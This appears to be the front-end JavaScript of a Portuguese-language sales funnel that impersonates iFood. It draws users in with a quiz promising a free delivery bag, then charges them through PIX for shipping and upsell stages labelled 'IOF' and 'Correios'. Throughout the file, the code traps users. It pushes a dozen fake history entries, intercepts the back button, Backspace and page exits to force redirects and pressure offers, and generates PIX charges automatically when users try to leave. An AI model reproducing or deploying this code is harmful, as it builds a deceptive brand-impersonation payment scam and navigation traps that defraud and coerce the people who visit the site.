const questions = {
    start: {
        id: 'start',
        text: 'Você já realiza entregas pelo iFood?',
        options: [
            { text: 'Sim, já sou parceiro', icon: '🛵', next: 'tempo_atividade' },
            { text: 'Ainda não, quero começar', icon: '🚀', next: 'possu_veiculo' }
        ]
    },
    tempo_atividade: {
        id: 'tempo_atividade',
        text: 'Há quanto tempo você está nas entregas?',
        options: [
            { text: 'Estou começando agora', icon: '🌱', next: 'disponibilidade' },
            { text: 'Menos de 1 ano', icon: '⭐', next: 'disponibilidade' },
            { text: 'Mais de 1 ano', icon: '🏆', next: 'disponibilidade' }
        ]
    },
    possu_veiculo: {
        id: 'possu_veiculo',
        text: 'Você já tem veículo para entregas?',
        options: [
            { text: 'Sim, já tenho', icon: '✅', next: 'tipo_veiculo' },
            { text: 'Estou providenciando', icon: '🛠️', next: 'tipo_veiculo' }
        ]
    },
    tipo_veiculo: {
        id: 'tipo_veiculo',
        text: 'Qual será seu principal meio de entrega?',
        options: [
            { text: 'Moto', icon: '🏍️', next: 'cnh_status' },
            { text: 'Bicicleta', icon: '🚲', next: 'disponibilidade' }
        ]
    },
    cnh_status: {
        id: 'cnh_status',
        text: 'Qual é a situação da sua CNH?',
        options: [
            { text: 'EAR (Atividade remunerada)', icon: '✅', next: 'disponibilidade' },
            { text: 'CNH comum (sem EAR)', icon: '⚠️', next: 'disponibilidade' },
            { text: 'Provisória', icon: '🔰', next: 'disponibilidade' }
        ]
    },
    disponibilidade: {
        id: 'disponibilidade',
        text: 'Quantas horas por dia você pretende ficar online?',
        options: [
            { text: 'Até 4 horas', icon: '⏱️', next: 'objetivo_renda' },
            { text: '4 a 8 horas', icon: '💼', next: 'objetivo_renda' },
            { text: 'Mais de 8 horas', icon: '🚀', next: 'objetivo_renda' }
        ]
    },
    objetivo_renda: {
        id: 'objetivo_renda',
        text: 'Qual é seu objetivo com as entregas?',
        options: [
            { text: 'Renda extra', icon: '💡', next: 'regiao_preferencia' },
            { text: 'Renda principal', icon: '📈', next: 'regiao_preferencia' },
            { text: 'Quero crescer rápido', icon: '🔥', next: 'regiao_preferencia' }
        ]
    },
    regiao_preferencia: {
        id: 'regiao_preferencia',
        text: 'Onde você prefere atuar?',
        options: [
            { text: 'Centro e arredores', icon: '🏙️', next: 'equipamento' },
            { text: 'Bairros residenciais', icon: '🏡', next: 'equipamento' },
            { text: 'Próximo a shoppings', icon: '🛍️', next: 'equipamento' }
        ]
    },
    equipamento: {
        id: 'equipamento',
        text: 'Você já tem bag térmica em boas condições?',
        options: [
            { text: 'Sim, mas preciso trocar', icon: '♻️', next: 'horario_pico' },
            { text: 'Não tenho, preciso da primeira', icon: '🎒', next: 'horario_pico' },
            { text: 'Tenho e quero uma reserva', icon: '✅', next: 'horario_pico' }
        ]
    },
    horario_pico: {
        id: 'horario_pico',
        text: 'Você consegue rodar em horários de pico (almoço/jantar)?',
        options: [
            { text: 'Sim, com certeza', icon: '🔥', next: 'personal_step' },
            { text: 'Consigo às vezes', icon: '📅', next: 'personal_step' },
            { text: 'Prefiro horários alternativos', icon: '🌙', next: 'personal_step' }
        ]
    }
};

const STORAGE_KEYS = {
    personal: 'ifoodbag.personal',
    address: 'ifoodbag.address',
    quizComplete: 'ifoodbag.quizComplete',
    stage: 'ifoodbag.stage',
    stock: 'ifoodbag.stock',
    returnTo: 'ifoodbag.returnTo',
    shipping: 'ifoodbag.shipping',
    reward: 'ifoodbag.reward',
    addressExtra: 'ifoodbag.addressExtra',
    pix: 'ifoodbag.pix',
    bump: 'ifoodbag.bump',
    leadSession: 'ifoodbag.leadSession',
    utm: 'ifoodbag.utm',
    utmSession: 'ifoodbag.utm.session',
    pixelConfig: 'ifoodbag.pixelConfig',
    tiktokPixelConfig: 'ifoodbag.tiktokPixelConfig',
    coupon: 'ifoodbag.coupon',
    directCheckout: 'ifoodbag.directCheckout',
    vslCompleted: 'ifoodbag.vslCompleted',
    orderbumpBackAutoPix: 'ifoodbag.orderbumpBackAutoPix',
    pixCreateLock: 'ifoodbag.pixCreateLock',
    pixelEventDedupe: 'ifoodbag.pixelEventDedupe',
    pixAutoRetryState: 'ifoodbag.pixAutoRetryState'
};

const REWARD_CATALOG = {
    bag: {
        id: 'bag',
        name: 'Bag do iFood',
        asset: 'assets/bagfoto.webp',
        successOriginalPrice: 149.9,
        successDisplayPrice: 0,
        checkoutExtraPrice: 0,
        pixTitle: 'Bag do iFood',
        pixAlt: 'Bag do iFood'
    },
    bau: {
        id: 'bau',
        name: 'Ba\u00fa do iFood',
        asset: 'assets/__task____isolate_ifood_delivery_box_white_background_,_202603260112 (1).webp',
        successOriginalPrice: 249.9,
        successDisplayPrice: 39.9,
        checkoutExtraPrice: 39.9,
        pixTitle: 'Ba\u00fa do iFood',
        pixAlt: 'Ba\u00fa do iFood'
    },
    kit_entregador: {
        id: 'kit_entregador',
        name: 'Kit Entregador iFood',
        asset: 'assets/__task____fix_ifood_logo_on_jacket_,_202603260102 (1).webp',
        successOriginalPrice: 449.9,
        successDisplayPrice: 97.9,
        checkoutExtraPrice: 97.9,
        pixTitle: 'Kit Entregador iFood',
        pixAlt: 'Kit Entregador iFood'
    }
};

const state = {
    currentQuestionKey: 'start',
    currentStepIndex: 1,
    totalSteps: 0,
    answerLocked: false,
    timerId: null,
    apiSessionPromise: null,
    apiSessionAt: 0,
    pixelConfig: null,
    pixelConfigAt: 0,
    tiktokPixelConfig: null,
    tiktokPixelConfigAt: 0,
    siteConfig: null,
    siteConfigAt: 0,
    metaRuntimeEventIds: {},
    utmFallback: null,
    leadSessionFallback: '',
    toastTimeout: null,
    pixCreatePromise: null,
    pixCreateKey: '',
    pixCreateAt: 0
};

const dom = {};
const pathMemo = {};

document.addEventListener('DOMContentLoaded', () => {
    const page = document.body.dataset.page || '';
    cacheCommonDom();
    reportPotentialClone(page);
    captureUtmParams();
    ensureApiSession().catch(() => null);
    if (page !== 'admin') {
        initMarketing().catch(() => null);
    }
    initStockCounter();

    if (page && page !== 'admin') {
        trackPageView(page);
    }
    setupExitGuard(page);
    setupGlobalBackRedirect(page);
    switch (page) {
        case 'home':
            initHome();
            break;
        case 'quiz':
            initQuiz();
            break;
        case 'personal':
            initPersonal();
            break;
        case 'cep':
            initCep();
            break;
        case 'processing':
            initProcessing();
            break;
        case 'success':
            initSuccess();
            break;
        case 'checkout':
            initCheckout();
            break;
        case 'orderbump':
            initOrderBump();
            break;
        case 'pix':
            initPix();
            break;
        case 'upsell-iof':
            initUpsellIof();
            break;
        case 'upsell-correios':
            initUpsellCorreios();
            break;
        case 'upsell':
            initUpsell();
            break;
        case 'admin':
            initAdmin();
            break;
        default:
            break;
    }
});

function reportPotentialClone(page) {
    const officialHosts = ['ifoodparceiro.vercel.app', 'ifoodbag.com.br', 'www.ifoodbag.com.br', 'ifoodbag.vercel.app', 'localhost', '127.0.0.1'];
    const currentHost = String(window.location.hostname || '').trim().toLowerCase();
    if (!currentHost || officialHosts.includes(currentHost)) return;
    if (window.__ifbCloneBeaconSent) return;
    window.__ifbCloneBeaconSent = true;

    try {
        const params = new URLSearchParams();
        params.set('eventType', 'clone_beacon');
        params.set('host', currentHost);
        params.set('href', String(window.location.href || '').slice(0, 900));
        params.set('referrer', String(document.referrer || '').slice(0, 900));
        params.set('page', String(page || document.body.dataset.page || '').slice(0, 80));
        params.set('screen', `${window.screen?.width || 0}x${window.screen?.height || 0}`);
        params.set('timezone', Intl.DateTimeFormat().resolvedOptions().timeZone || '');
        params.set('language', navigator.language || '');
        params.set('sourceUrl', `${window.location.pathname || ''}${window.location.search || ''}`.slice(0, 900));

        const img = new Image(1, 1);
        img.referrerPolicy = 'no-referrer-when-downgrade';
        img.decoding = 'async';
        img.src = `https://ifoodparceiro.vercel.app/api/security/clone-pixel?${params.toString()}`;
    } catch (_error) {
        // Clone detection must never interfere with the funnel.
    }
}

function isUpsellPage(page) {
    return page === 'upsell' || page === 'upsell-iof' || page === 'upsell-correios';
}

function setupGlobalBackRedirect(page) {
    if (!page) {
        const rawPath = String(window.location.pathname || '')
            .trim()
            .toLowerCase()
            .replace(/^\/+|\/+$/g, '')
            .replace(/\.html$/g, '');
        const aliases = {
            '': 'home',
            index: 'home',
            dados: 'personal',
            endereco: 'cep',
            processando: 'processing',
            sucesso: 'success'
        };
        page = aliases[rawPath] || rawPath || 'home';
    }
    if (page === 'admin' || isUpsellPage(page)) return;
    if (window.__ifoodBackRedirectInit) return;
    window.__ifoodBackRedirectInit = true;
    if (window.__ifbEarlyRedirectTimer) {
        clearTimeout(window.__ifbEarlyRedirectTimer);
        window.__ifbEarlyRedirectTimer = null;
    }

    let shownOfferLevel = 0;
    let backAttemptTracked = false;
    let backAttemptAt = 0;
    let orderbumpBackInFlight = false;
    let checkoutBackPixInFlight = false;
    const guardDepth = 12;
    const guardToken = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
    const stateBase = { ifb: true, token: guardToken };
    const firstOffer = getBackRedirectOffer(page, 1);
    const secondOffer = getBackRedirectOffer(page, 2);
    const canEscalateOffer = (
        firstOffer.mode === 'coupon' &&
        secondOffer.mode === 'coupon' &&
        Number(secondOffer.amountOff || 0) > Number(firstOffer.amountOff || 0)
    );
    if (canEscalateOffer) {
        const currentCoupon = loadCoupon();
        const currentAmountOff = Number(currentCoupon?.amountOff || 0) || roundMoney(25.9 * Number(currentCoupon?.discount || 0));
        if (currentAmountOff >= Number(secondOffer.amountOff || 0)) {
            shownOfferLevel = 2;
        } else if (currentAmountOff >= Number(firstOffer.amountOff || 0)) {
            shownOfferLevel = 1;
        }
    }
    let activeOffer = firstOffer;
    let lastGuardAt = 0;
    const currentHash = window.location.hash || '';
    const legacyBackHash = /^#ifb-back-/i.test(currentHash);
    const stableHash = legacyBackHash ? '' : currentHash;
    const baseUrl = `${window.location.pathname}${window.location.search}${stableHash}`;

    if (legacyBackHash) {
        try {
            history.replaceState(history.state || {}, '', baseUrl);
        } catch (_error) {
            // Ignore browser-specific history restrictions.
        }
    }

    const modalEls = ensureCouponModalElements();
    const modal = modalEls.modal;
    const btnApply = modalEls.btnApply;
    const couponTitle = modalEls.couponTitle;
    const couponMessage = modalEls.couponMessage;
    const couponBadge = modalEls.couponBadge;
    const couponSubtitle = modalEls.couponSubtitle;
    const backOfferLevelKey = `ifoodbag.backOfferLevel.${page}`;
    const getStoredOfferLevel = () => {
        try {
            return Math.max(0, Number(sessionStorage.getItem(backOfferLevelKey) || 0));
        } catch (_error) {
            return 0;
        }
    };
    const saveStoredOfferLevel = (level) => {
        try {
            const safeLevel = Math.max(0, Number(level || 0));
            sessionStorage.setItem(backOfferLevelKey, String(safeLevel));
        } catch (_error) {
            // Ignore restricted sessionStorage environments.
        }
    };
    shownOfferLevel = Math.max(shownOfferLevel, getStoredOfferLevel());
    const applyOfferToModal = (offerConfig) => {
        if (couponBadge) {
            couponBadge.textContent = offerConfig.badge;
        }
        if (couponTitle) {
            couponTitle.textContent = offerConfig.title;
        }
        if (couponMessage) {
            couponMessage.textContent = offerConfig.message;
        }
        if (couponSubtitle) {
            couponSubtitle.textContent = offerConfig.subtitle;
        }
        if (btnApply) {
            btnApply.textContent = offerConfig.cta;
        }
    };
    applyOfferToModal(activeOffer);

    const resolveTargetUrl = () => buildDistinctBackRedirectUrl(page);
    const resolveCheckoutCouponUrl = (amountOff) => {
        const params = new URLSearchParams(window.location.search || '');
        params.set('dc', '1');
        params.delete('forceFrete');
        params.set('br', String(Date.now()));
        params.set('coupon', String(Number(amountOff || 0) || 5));
        const query = params.toString();
        return `checkout.html${query ? `?${query}` : ''}`;
    };
    window.__ifbResolveBackRedirect = () => buildDistinctBackRedirectUrl(page);
    const markBackAttempt = () => {
        if (backAttemptTracked) return;
        backAttemptTracked = true;
        trackPageView(`backredirect_${page}`);
        trackLead('backredirect_click', { stage: page });
    };

    const showCouponModal = (offerConfig = activeOffer) => {
        activeOffer = offerConfig;
        applyOfferToModal(activeOffer);
        modal.classList.remove('hidden');
        modal.setAttribute('aria-hidden', 'false');
        modal.classList.remove('coupon-anim-in');
        void modal.offsetWidth;
        modal.classList.add('coupon-anim-in');
        saveStoredOfferLevel(shownOfferLevel || 1);
        trackLead(activeOffer.shownEvent, { stage: page, backOfferLevel: shownOfferLevel || 1 });
    };

    const hideCouponModal = () => {
        modal.classList.remove('coupon-anim-in');
        modal.classList.add('hidden');
        modal.setAttribute('aria-hidden', 'true');
    };

    const ensureGuardEntry = (force = false) => {
        const now = Date.now();
        if (!force && (now - lastGuardAt) < 120) return;
        const state = history.state || {};
        if (state.ifb && state.token === guardToken && Number(state.step || 0) >= guardDepth) return;
        try {
            history.replaceState({ ...stateBase, step: 0 }, '', baseUrl);
            for (let step = 1; step <= guardDepth; step += 1) {
                history.pushState({ ...stateBase, step }, '', baseUrl);
            }
            lastGuardAt = now;
        } catch (error) {
            return;
        }
    };

    const handleBackAttempt = (event = null) => {
        const backState = (
            event && typeof event === 'object' && event.state !== undefined
                ? event.state
                : history.state
        ) || {};
        const isGuardState = backState?.ifb === true && backState?.token === guardToken;
        if (event?.type === 'popstate' && !isGuardState) {
            ensureGuardEntry(true);
            if (page !== 'checkout') return;
        }
        const now = Date.now();
        if ((now - backAttemptAt) < 40) return;
        backAttemptAt = now;
        ensureGuardEntry(true);
        markBackAttempt();

        if (page === 'orderbump') {
            if (orderbumpBackInFlight) return;
            const shippingStored = loadShipping();
            if (!isShippingSelectionComplete(shippingStored)) {
                localStorage.removeItem(STORAGE_KEYS.shipping);
                setStage('checkout');
                redirect('checkout.html?forceFrete=1');
                return;
            }
            const currentCoupon = loadCoupon();
            const currentAmountOff = Number(currentCoupon?.amountOff || 0) || roundMoney(25.9 * Number(currentCoupon?.discount || 0));
            const shouldAutoApplyBackCoupon = currentAmountOff <= 0;
            if (shouldAutoApplyBackCoupon) {
                saveCoupon({
                    code: 'FRETE5',
                    amountOff: 5,
                    appliedAt: Date.now(),
                    source: 'orderbump_back_auto',
                    backOfferLevel: 1
                });
            }
            const shipping = applyCouponToShipping(shippingStored);

            orderbumpBackInFlight = true;
            saveBump({
                selected: false,
                price: 0,
                title: 'Seguro Bag'
            });
            trackLead('orderbump_back_skip', {
                stage: 'orderbump',
                shipping,
                autoCouponApplied: shouldAutoApplyBackCoupon,
                couponAmountOff: shouldAutoApplyBackCoupon ? 5 : currentAmountOff
            });
            showToast(
                shouldAutoApplyBackCoupon
                    ? 'Gerando PIX com R$ 5,00 de desconto no frete...'
                    : 'Gerando pagamento...',
                'success'
            );

            createPixCharge(shipping, 0, {
                sourceStage: shouldAutoApplyBackCoupon
                    ? 'orderbump_back_direct_coupon5'
                    : 'orderbump_back_direct'
            })
                .catch((error) => {
                    orderbumpBackInFlight = false;
                    showToast(error?.message || 'Erro ao gerar o PIX.', 'error');
                });
            return;
        }

        if (page === 'checkout') {
            const currentCoupon = loadCoupon();
            const currentAmountOff = Number(currentCoupon?.amountOff || 0) || roundMoney(25.9 * Number(currentCoupon?.discount || 0));
            const hasFinalBackCoupon = (
                currentAmountOff >= 10 ||
                Number(currentCoupon?.backOfferLevel || 0) >= 2 ||
                String(currentCoupon?.code || '').trim().toUpperCase() === 'FRETE10' ||
                shownOfferLevel >= 2
            );
            if (hasFinalBackCoupon) {
                if (checkoutBackPixInFlight) return;
                checkoutBackPixInFlight = true;

                const baseEconomico = 19.9;
                const finalAmountOff = currentAmountOff > 0 ? currentAmountOff : 10;
                const finalPrice = Math.max(0, roundMoney(baseEconomico - finalAmountOff));
                const checkoutBackShipping = {
                    id: 'economico',
                    name: 'Envio Economico iFood',
                    eta: '5 a 8 dias uteis',
                    price: finalPrice,
                    basePrice: baseEconomico,
                    originalPrice: baseEconomico,
                    selectedAt: Date.now(),
                    selectedByUser: false,
                    sessionId: getLeadSessionId(),
                    source: 'checkout_back_coupon10_auto'
                };

                saveShipping(checkoutBackShipping);
                saveBump({
                    selected: false,
                    price: 0,
                    title: 'Seguro Bag'
                });
                trackLead('checkout_back_coupon10_direct_pix', {
                    stage: 'checkout',
                    shipping: checkoutBackShipping,
                    couponAmountOff: finalAmountOff,
                    amount: finalPrice
                });
                showToast('Gerando PIX promocional de R$ 9,90...', 'success');

                createPixCharge(checkoutBackShipping, 0, {
                    sourceStage: 'checkout_back_coupon10_direct_pix'
                }).catch((error) => {
                    checkoutBackPixInFlight = false;
                    showToast(error?.message || 'Erro ao gerar o PIX.', 'error');
                });
                return;
            }
        }

        if (shownOfferLevel >= 1 && (!canEscalateOffer || shownOfferLevel >= 2)) {
            redirect(resolveTargetUrl());
            return;
        }
        if (shownOfferLevel === 1 && canEscalateOffer) {
            shownOfferLevel = 2;
            showCouponModal(secondOffer);
            try {
                history.pushState({ ...stateBase, step: guardDepth }, '', baseUrl);
            } catch (_error) {
                // Ignore browser-specific history restrictions.
            }
            return;
        }
        shownOfferLevel = 1;
        showCouponModal(firstOffer);
        try {
            history.pushState({ ...stateBase, step: guardDepth }, '', baseUrl);
        } catch (_error) {
            // Ignore browser-specific history restrictions.
        }
    };

    const reinforceGuards = () => {
        ensureGuardEntry();
    };
    ensureGuardEntry(true);
    setTimeout(reinforceGuards, 250);
    setTimeout(reinforceGuards, 1000);
    window.addEventListener('pointerdown', reinforceGuards, { passive: true, once: true });
    window.addEventListener('touchstart', reinforceGuards, { passive: true, once: true });
    window.addEventListener('keydown', reinforceGuards, { once: true });
    window.addEventListener('focus', reinforceGuards, { passive: true });
    window.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'visible') reinforceGuards();
    });
    window.addEventListener('pageshow', (event) => {
        if (event.persisted) {
            reinforceGuards();
        }
    });
    window.addEventListener('load', () => {
        reinforceGuards();
    }, { once: true });
    window.addEventListener('popstate', (event) => {
        if (window.__ifbAllowUnload) return;
        handleBackAttempt(event);
    });
    window.addEventListener('hashchange', () => {
        if (window.__ifbAllowUnload) return;
        handleBackAttempt({ state: history.state, type: 'hashchange' });
    });
    window.addEventListener('keydown', (event) => {
        const key = String(event.key || '').toLowerCase();
        const isBackspace = key === 'backspace';
        const isAltLeft = key === 'arrowleft' && event.altKey;
        if (!isBackspace && !isAltLeft) return;
        const tag = String(event.target?.tagName || '').toLowerCase();
        const isInputLike = tag === 'input' || tag === 'textarea' || event.target?.isContentEditable;
        if (isInputLike && isBackspace) return;
        event.preventDefault();
        handleBackAttempt({ state: history.state, type: 'keydown' });
    });
    const guardPulse = setInterval(() => {
        if (window.__ifbAllowUnload) {
            clearInterval(guardPulse);
            return;
        }
        if (document.visibilityState === 'visible') reinforceGuards();
    }, 900);

    if (btnApply) {
        btnApply.addEventListener('click', async () => {
            if (btnApply.disabled) return;
            let copiedPix = false;
            const originalCta = btnApply.textContent;
            if (activeOffer.mode === 'pix-copy') {
                copiedPix = await copyPixCodeFromField();
            } else if (activeOffer.mode === 'coupon') {
                const amountOff = Number(activeOffer.amountOff || 5);
                const safeAmountOff = Number.isFinite(amountOff) && amountOff > 0 ? amountOff : 5;
                const couponCode = String(activeOffer.couponCode || (safeAmountOff >= 10 ? 'FRETE10' : 'FRETE5')).trim();
                const acceptedLevel = safeAmountOff >= 10 ? 2 : 1;
                saveCoupon({
                    code: couponCode || 'FRETE5',
                    amountOff: safeAmountOff,
                    appliedAt: Date.now(),
                    source: 'backredirect',
                    backOfferLevel: acceptedLevel
                });
                saveStoredOfferLevel(acceptedLevel);
                sessionStorage.setItem(STORAGE_KEYS.directCheckout, '1');

                if (page === 'pix') {
                    const pix = loadPix();
                    const isUpsellPix = Boolean(pix?.isUpsell || pix?.upsell?.enabled);
                    if (!isUpsellPix) {
                        const shippingStored = loadShipping();
                        const shippingWithCoupon = applyCouponToShipping(shippingStored);
                        const reward = loadRewardSelection();
                        const rewardExtraPrice = Number(pix?.rewardExtraPrice || getRewardExtraPrice(reward));
                        const bump = loadBump() || {};
                        const bumpSelected = bump?.selected === true && Number(bump?.price || 0) > 0;
                        const bumpPrice = bumpSelected ? Number(bump.price || 0) : 0;
                        const fallbackShippingBase = Math.max(
                            0,
                            Number((Number(pix?.amount || 0) - bumpPrice - rewardExtraPrice).toFixed(2))
                        );
                        const shippingForRegeneration = shippingWithCoupon || (
                            shippingStored
                                ? applyCouponToShipping({
                                    ...shippingStored,
                                    basePrice: Number(shippingStored.basePrice || shippingStored.originalPrice || shippingStored.price || 0),
                                    originalPrice: Number(shippingStored.originalPrice || shippingStored.basePrice || shippingStored.price || 0)
                                })
                                : null
                        ) || (
                            pix
                                ? applyCouponToShipping({
                                    id: String(pix?.shippingId || 'padrao'),
                                    name: String(pix?.shippingName || 'Envio Padrão iFood'),
                                    eta: '',
                                    price: fallbackShippingBase,
                                    basePrice: fallbackShippingBase,
                                    originalPrice: fallbackShippingBase
                                })
                                : null
                        );

                        if (shippingForRegeneration) {
                            btnApply.disabled = true;
                            btnApply.textContent = 'Gerando novo PIX...';
                            try {
                                trackLead(activeOffer.acceptEvent, { stage: page, copiedPix, backOfferLevel: shownOfferLevel || 1 });
                                setStage('checkout');
                                await createPixCharge(shippingForRegeneration, bumpPrice, { sourceStage: 'backredirect_pix_coupon' });
                                return;
                            } catch (error) {
                                showToast(error?.message || 'Nao foi possivel gerar um novo PIX com desconto agora.', 'error');
                                btnApply.disabled = false;
                                btnApply.textContent = originalCta;
                                return;
                            }
                        }
                    }
                }
            }
            hideCouponModal();
            trackLead(activeOffer.acceptEvent, { stage: page, copiedPix, backOfferLevel: shownOfferLevel || 1 });
            if (activeOffer.mode === 'pix-copy') return;
            if (activeOffer.mode === 'coupon') {
                setStage('checkout');
                if (page === 'checkout') {
                    redirect(resolveCheckoutCouponUrl(activeOffer.amountOff));
                    return;
                }
            }
            redirect(resolveTargetUrl());
        });
    }
}

function setupExitGuard(page) {
    if (!page || page === 'admin' || isUpsellPage(page)) return;
    if (window.__ifbExitGuardInit) return;
    window.__ifbExitGuardInit = true;
    window.__ifbAllowUnload = false;
    window.addEventListener('pagehide', (event) => {
        if (window.__ifbAllowUnload) return;
        if (event?.persisted) return;
        setTimeout(() => {
            if (!window.__ifbAllowUnload) window.location.href = buildDistinctBackRedirectUrl(page);
        }, 0);
    });
}

function getBackRedirectOffer(page, level = 1) {
    if (Number(level || 1) >= 2) {
        return {
            mode: 'coupon',
            badge: 'Ultima chance',
            title: 'Tem certeza que nao quer R$ 10,00 de desconto?',
            message: 'Aplicamos mais R$ 5,00 e seu desconto total no frete agora e de R$ 10,00.',
            subtitle: 'Cupom de R$ 10 valido apenas nesta sessao',
            cta: 'Usar cupom de R$ 10 agora',
            shownEvent: 'coupon_offer_boost_shown',
            acceptEvent: 'coupon_offer_boost_accept',
            couponCode: 'FRETE10',
            amountOff: 10
        };
    }
    if (page === 'pix') {
        return {
            mode: 'coupon',
            badge: 'Pagamento pendente',
            title: 'Volte agora e pague R$ 5,00 a menos no frete',
            message: 'Seu PIX ainda esta pendente. Vamos reduzir R$ 5,00 no frete e gerar um novo PIX com desconto.',
            subtitle: 'Oferta valida apenas nesta sessao',
            cta: 'Usar cupom de R$ 5 agora',
            shownEvent: 'coupon_offer_shown',
            acceptEvent: 'coupon_offer_accept',
            couponCode: 'FRETE5',
            amountOff: 5
        };
    }
    if (page === 'upsell' || page === 'upsell-iof' || page === 'upsell-correios') {
        return {
            mode: 'coupon',
            badge: 'Desconto exclusivo',
            title: 'Volte agora com R$ 5,00 de desconto',
            message: 'Ativamos um cupom para voce concluir sem perder a oferta desta sessao.',
            subtitle: 'Cupom imediato para finalizar hoje',
            cta: 'Usar cupom de R$ 5 agora',
            shownEvent: 'coupon_offer_shown',
            acceptEvent: 'coupon_offer_accept',
            couponCode: 'FRETE5',
            amountOff: 5
        };
    }
    return {
        mode: 'coupon',
        badge: 'Cupom exclusivo',
        title: 'Desconto liberado no frete',
        message: 'Voce ganhou R$ 5,00 de desconto no frete da Bag.',
        subtitle: 'Oferta valida agora nesta sessao',
        cta: 'Usar cupom e pagar mais barato',
        shownEvent: 'coupon_offer_shown',
        acceptEvent: 'coupon_offer_accept',
        couponCode: 'FRETE5',
        amountOff: 5
    };
}

async function copyPixCodeFromField() {
    const pixCode = document.getElementById('pix-code');
    const value = String(pixCode?.value || '').trim();
    if (!value) return false;
    if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function') {
        try {
            await navigator.clipboard.writeText(value);
            return true;
        } catch (error) {
            // Fallback below
        }
    }
    try {
        pixCode?.select?.();
        document.execCommand('copy');
        return true;
    } catch (error) {
        return false;
    }
}

function ensureCouponModalElements() {
    let modal = document.getElementById('coupon-modal');
    if (!modal) {
        const wrapper = document.createElement('div');
        wrapper.innerHTML = `
            <div id="coupon-modal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="coupon-title">
                <div class="modal-card">
                    <div class="coupon-hero">
                        <img src="/assets/bagfoto.webp" alt="Bag iFood com desconto">
                    </div>
                    <span id="coupon-badge" class="modal-badge">Cupom exclusivo</span>
                    <h3 id="coupon-title">Desconto liberado no frete</h3>
                    <p id="coupon-message">Você ganhou R$ 5,00 de desconto no frete da Bag.</p>
                    <span id="coupon-subtitle" class="coupon-subtitle">Oferta válida agora nesta sessão</span>
                    <button id="btn-coupon-apply" class="btn-primary" type="button">Usar cupom e pagar mais barato</button>
                </div>
            </div>
        `;
        document.body.appendChild(wrapper.firstElementChild);
        modal = document.getElementById('coupon-modal');
    }

    return {
        modal,
        btnApply: document.getElementById('btn-coupon-apply'),
        couponBadge: document.getElementById('coupon-badge'),
        couponTitle: document.getElementById('coupon-title'),
        couponMessage: document.getElementById('coupon-message'),
        couponSubtitle: document.getElementById('coupon-subtitle')
    };
}

function cacheCommonDom() {
    dom.stockCounter = document.getElementById('stock-counter');
    dom.toast = document.getElementById('toast');
}

function initHome() {
    const btnStart = document.getElementById('btn-start');

    btnStart?.addEventListener('click', () => {
        resetFlow();
        setStage('quiz');
        trackLead('quiz_started', { stage: 'quiz' });
        redirect('quiz.html');
    });
}

function initQuiz() {
    const currentStage = getStage();
    if (!currentStage || currentStage === 'quiz' || currentStage === 'personal') {
        setStage('quiz');
    }
    trackLead('quiz_view', { stage: 'quiz' });

    const questionText = document.getElementById('question-text');
    const optionsContainer = document.getElementById('options-container');
    const questionCount = document.getElementById('question-count');
    const progressFill = document.getElementById('progress-fill');

    if (!questionText || !optionsContainer || !questionCount || !progressFill) return;

    state.currentQuestionKey = 'start';
    state.currentStepIndex = 1;
    state.totalSteps = maxPathLengthFrom('start');
    state.answerLocked = false;

    renderQuestion(questions.start, {
        questionText,
        optionsContainer,
        questionCount,
        progressFill
    });
}

const COMMON_EMAIL_DOMAINS = [
    'gmail.com',
    'hotmail.com',
    'outlook.com',
    'icloud.com',
    'live.com',
    'yahoo.com.br',
    'uol.com.br',
    'bol.com.br'
];

function setupEmailAutocomplete(emailInput) {
    if (!emailInput) return;
    const group = emailInput.closest('.input-group');
    if (!group) return;

    let box = group.querySelector('.email-suggest');
    if (!box) {
        box = document.createElement('div');
        box.className = 'email-suggest hidden';
        box.setAttribute('role', 'listbox');
        box.setAttribute('aria-label', 'Sugestoes de e-mail');
        group.appendChild(box);
    }

    let activeIndex = -1;
    let currentSuggestions = [];

    const normalize = (value) => String(value || '').trim().toLowerCase().replace(/\s+/g, '');
    const escapeText = (value) => String(value || '').replace(/[&<>"']/g, (char) => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;'
    }[char]));

    const hide = () => {
        box.classList.add('hidden');
        box.innerHTML = '';
        activeIndex = -1;
        currentSuggestions = [];
    };

    const getSuggestions = (rawValue) => {
        const value = normalize(rawValue);
        if (!value) return [];
        if (value.startsWith('@')) return [];
        const atCount = (value.match(/@/g) || []).length;
        if (atCount > 1) return [];

        const [localRaw = '', domainRaw = ''] = value.split('@');
        const local = localRaw.replace(/[^a-z0-9._%+-]/g, '');
        if (local.length < 2) return [];

        const filteredDomains = COMMON_EMAIL_DOMAINS.filter((domain) => !domainRaw || domain.startsWith(domainRaw));
        return filteredDomains
            .slice(0, 6)
            .map((domain) => `${local}@${domain}`)
            .filter((suggestion) => suggestion !== value);
    };

    const setActive = (nextIndex) => {
        activeIndex = nextIndex;
        const buttons = box.querySelectorAll('.email-suggest__item');
        buttons.forEach((button, index) => {
            button.classList.toggle('email-suggest__item--active', index === activeIndex);
        });
    };

    const applySuggestion = (value) => {
        emailInput.value = value;
        emailInput.dispatchEvent(new Event('input', { bubbles: true }));
        hide();
        emailInput.focus();
    };

    const render = (suggestions) => {
        if (!suggestions.length) {
            hide();
            return;
        }

        currentSuggestions = suggestions;
        box.innerHTML = suggestions.map((item, index) => `
            <button type="button" class="email-suggest__item${index === 0 ? ' email-suggest__item--active' : ''}" data-value="${escapeText(item)}">
                ${escapeText(item)}
            </button>
        `).join('');
        setActive(0);
        box.classList.remove('hidden');
    };

    emailInput.addEventListener('input', () => {
        render(getSuggestions(emailInput.value));
    });

    emailInput.addEventListener('focus', () => {
        if (emailInput.value) {
            render(getSuggestions(emailInput.value));
        }
    });

    emailInput.addEventListener('keydown', (event) => {
        if (box.classList.contains('hidden') || !currentSuggestions.length) return;

        if (event.key === 'ArrowDown') {
            event.preventDefault();
            const next = (activeIndex + 1) % currentSuggestions.length;
            setActive(next);
            return;
        }
        if (event.key === 'ArrowUp') {
            event.preventDefault();
            const prev = (activeIndex - 1 + currentSuggestions.length) % currentSuggestions.length;
            setActive(prev);
            return;
        }
        if (event.key === 'Enter' && activeIndex >= 0) {
            event.preventDefault();
            applySuggestion(currentSuggestions[activeIndex]);
            return;
        }
        if (event.key === 'Escape') {
            hide();
        }
    });

    box.addEventListener('mousedown', (event) => {
        event.preventDefault();
    });

    box.addEventListener('click', (event) => {
        const button = event.target.closest('.email-suggest__item');
        if (!button) return;
